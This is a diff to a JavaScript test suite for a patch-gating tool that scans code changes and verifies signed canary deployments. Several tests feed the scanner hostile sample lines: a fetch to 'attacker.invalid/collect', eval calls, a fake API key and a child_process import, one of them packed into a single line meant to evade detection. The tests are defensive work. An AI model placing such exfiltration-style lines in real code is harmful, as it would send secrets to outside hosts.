@@ -29,7 +29,7 @@ function fixture(name='scripts/example.mjs') {
   return {snapshot,subject,attestation,author,checks,review,run};
 }
 function deployment(subject) {
-  const bytes = Buffer.from('isolated canary\nSOURCE_COMMIT='+subject.head_sha+'\n');
+  const bytes = Buffer.from(JSON.stringify({schema:'ltzzz.patchgate.canary.v1',source_commit:subject.head_sha})+'\n');
   return {head_sha:subject.head_sha,base_sha:subject.base_sha,target_environment:'canary',expected_version_id:'version-1',
     observation:{url:'https://ltzzz-patchgate-test.example.workers.dev',http_status:200,redirected:false,started_at_utc:'2026-10-23T09:59:58Z',finished_at_utc:'2026-10-23T10:00:00Z',http_date:'Fri, 23 Oct 2026 09:59:59 GMT',body_base64:bytes.toString('base64'),body_sha256:sha256(bytes),header_source_commit:subject.head_sha,header_version_id:'version-1'},
     platform:{source:'cloudflare_current_deployment_api',http_status:200,service_name:'ltzzz-patchgate-test',observed_at_utc:'2026-10-23T09:59:59Z',versions:[{id:'version-1',percentage:100}]}};
@@ -114,15 +114,21 @@ test('L3 requires two different review providers and owner notification, no new 
 test('secret scan redacts findings; dynamic execution and new domains require resolution',() => {
   const changes=[['sk-'+'X'.repeat(24),'secret_pattern'],['eval("untrusted")','new_dynamic_execution_requires_review'],['import c from "node:child_process"','new_dynamic_execution_requires_review'],['https://attacker.invalid/collect','unapproved_external_host']];
   for (const [text,code] of changes) {
-    const findings=scanDiff(policy,[{...file('scripts/test.mjs'),diff:'+ '+text}]);
+    const findings=scanDiff(policy,[{...file('scripts/test.mjs'),diff:'@@ -0,0 +1 @@\n+ '+text}]);
     assert.ok(findings.some(x=>x.code===code));
     if (code==='secret_pattern') assert.ok(!JSON.stringify(findings).includes(text));
   }
-  assert.equal(scanDiff(policy,[{...file('docs/a.md'),diff:'+ https://ltzzz.com/docs'}]).length,0);
-  assert.ok(scanDiff(policy,[{...file('docs/a.md'),diff:'+ http://ltzzz.com/docs'}]).length);
+  assert.equal(scanDiff(policy,[{...file('docs/a.md'),diff:'@@ -0,0 +1 @@\n+ https://ltzzz.com/docs'}]).length,0);
+  assert.ok(scanDiff(policy,[{...file('docs/a.md'),diff:'@@ -0,0 +1 @@\n+ http://ltzzz.com/docs'}]).length);
+});
+test('added code beginning with ++ cannot hide eval, credentials or new hosts behind +++',() => {
+  const source='++counter; eval("payload"); const key="sk-'+'X'.repeat(24)+'"; fetch("https://attacker.invalid/collect");';
+  const diff='diff --git a/scripts/a.mjs b/scripts/a.mjs\n--- a/scripts/a.mjs\n+++ b/scripts/a.mjs\n@@ -0,0 +1 @@\n+'+source+'\n';
+  const findings=scanDiff(policy,[{...file('scripts/a.mjs'),diff}]);
+  for (const code of ['secret_pattern','new_dynamic_execution_requires_review','unapproved_external_host']) assert.ok(findings.some(x=>x.code===code));
 });
 test('deleted suspect line is not incorrectly treated as newly introduced',() => {
-  assert.equal(scanDiff(policy,[{...file('scripts/test.mjs'),diff:'- eval("old")\n+ safe()'}]).length,0);
+  assert.equal(scanDiff(policy,[{...file('scripts/test.mjs'),diff:'@@ -1 +1 @@\n- eval("old")\n+ safe()'}]).length,0);
 });
 test('path traversal, symlinks, gitlinks and binary data cannot pass',() => {
   const f=fixture();
@@ -172,6 +178,18 @@ test('freshness and Cloudflare CURRENT version are deterministic requirements, n
   assert.equal(verifyDeployment({subject:f.subject,evidence:e,allowedTargets,now:now-10000}).passed,false,'future observation is invalid');
   assert.equal(verifyDeployment({subject:f.subject,evidence:e,now}).passed,false,'standalone verifier also requires the base allowlist');
   assert.equal(verifyDeployment({subject:f.subject,evidence:e,allowedTargets:[{url:'https://other.example.workers.dev'}],now}).passed,false);
+  const cumulative=structuredClone(e);
+  Object.assign(cumulative.observation,{started_at_utc:'2026-10-23T09:50:02Z',finished_at_utc:'2026-10-23T09:55:01Z',http_date:'Fri, 23 Oct 2026 09:45:03 GMT'});
+  cumulative.platform.observed_at_utc='2026-10-23T09:50:03Z';
+  assert.equal(verifyDeployment({subject:f.subject,evidence:cumulative,allowedTargets,now}).checks.fresh,false,'clock allowances cannot accumulate');
+});
+test('commit marker must be a dedicated metadata object, not an embedded matching substring',() => {
+  const f=fixture('workers/a.js'),e=deployment(f.subject),allowedTargets=[{url:e.observation.url}];
+  for (const value of ['<!-- SOURCE_COMMIT='+B+' -->',JSON.stringify({comment:'SOURCE_COMMIT='+B}),JSON.stringify({schema:'ltzzz.patchgate.canary.v1',source_commit:A,comment:'SOURCE_COMMIT='+B}),'{"schema":"ltzzz.patchgate.canary.v1","source_commit":"'+A+'","source_commit":"'+B+'"}\n']) {
+    const changed=structuredClone(e),bytes=Buffer.from(value);
+    changed.observation.body_base64=bytes.toString('base64');changed.observation.body_sha256=sha256(bytes);
+    assert.equal(verifyDeployment({subject:f.subject,evidence:changed,allowedTargets,now}).checks.commit,false);
+  }
 });
 test('L2 canary must be signed and target must be in BASE allowlist',() => {
   const f=fixture('workers/a.js'),e=deployment(f.subject),proof=f.attestation(0,'deployment',{evidence:e});
@@ -183,6 +201,14 @@ test('L2 canary must be signed and target must be in BASE allowlist',() => {
   const r=evaluate({policy:p,trust,snapshot:g.snapshot,now,attestations:[attest(0,'author'),attest(0,'checks',{passed:true,checker_base_sha:A,checks_sha256:'1'.repeat(64)}),attest(1,'review',{verdict:'approve',generation_verified:true,model:'real',output_sha256:'2'.repeat(64),metadata_source:'provider_response',finish_reason:'stop'}),attest(0,'deployment',{evidence:deployment(subject)})]});
   assert.equal(r.validation_passed,true);
   assert.equal(r.deployment_verification.status,'reverified_deterministic');
+});
+test('adding L3 to a Worker patch never removes the L2 canary prerequisite',() => {
+  const original=fixture('workers/a.js'),snapshot={...original.snapshot,files:[file('workers/a.js'),file('config/example.json')]};
+  const subject=subjectFor(snapshot),attest=(i,role,extra={})=>{const payload={subject,role,at_utc:new Date(now).toISOString(),...extra};return {key_id:pairs[i].id,payload,signature:sign(null,Buffer.from(canonical(payload)),pairs[i].privateKey).toString('base64')};};
+  const attestations=[attest(0,'author'),attest(0,'checks',{passed:true,checker_base_sha:A,checks_sha256:'1'.repeat(64)}),...[1,2].map(i=>attest(i,'review',{verdict:'approve',generation_verified:true,model:'real',output_sha256:'2'.repeat(64),metadata_source:'provider_response',finish_reason:'stop'})),attest(0,'notification',{owner_notified:true,reference:'https://github.com/ltzyz2181-collab/ltzzz/issues/1'})];
+  const r=evaluate({policy,trust,snapshot,attestations,now});
+  assert.equal(r.risk_class,'L3');assert.equal(r.requires_canary,true);assert.equal(r.validation_passed,false);
+  assert.ok(r.reasons.includes('signed_allowlisted_canary_verification_required'));
 });
 test('configuration is loaded through BASE reader, never the candidate checkout',() => {
   const paths=[];
